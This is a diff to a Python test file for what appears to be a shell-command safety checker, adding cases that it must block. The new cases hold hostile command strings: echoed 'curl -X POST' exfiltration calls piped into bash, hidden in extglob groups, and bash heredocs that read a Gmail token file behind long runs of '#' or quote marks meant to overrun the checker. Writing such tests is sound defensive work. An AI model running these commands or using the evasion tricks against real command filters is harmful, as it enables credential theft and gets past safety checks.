@@ -794,6 +794,11 @@ class RuleGTextTheShellDoesNotRead(Base):
         for opener in ("@", "?", "*", "+", "!"):
             self.blocked("echo 'curl -X POST %s #' %s(#) | bash" % (self.SEND, opener), "G")
         self.allowed("echo ok # it's fine\nls /tmp")
+        # a # inside a deeper extglob group, and a row with more # and quote marks than the check will walk
+        self.blocked("echo 'curl -X POST %s' @(a| #) | bash" % self.SEND, "G")
+        self.blocked("echo 'curl -X POST %s' +(a|@(b #)) | bash" % self.SEND, "G")
+        self.blocked("bash <<'EOF'\n%s cat ~/.config/afa/gmail/token.json # it's\nEOF" % ("#" * 100), "G")
+        self.blocked("bash <<'EOF'\n%s ls # it's\nEOF" % ("'a' " * 40), "G")
 
     def test_a_shell_body_gets_no_allowlist(self):
         self.blocked("bash <<'EOF'\ngrep -q x %s\nEOF" % self.SEND, "G")
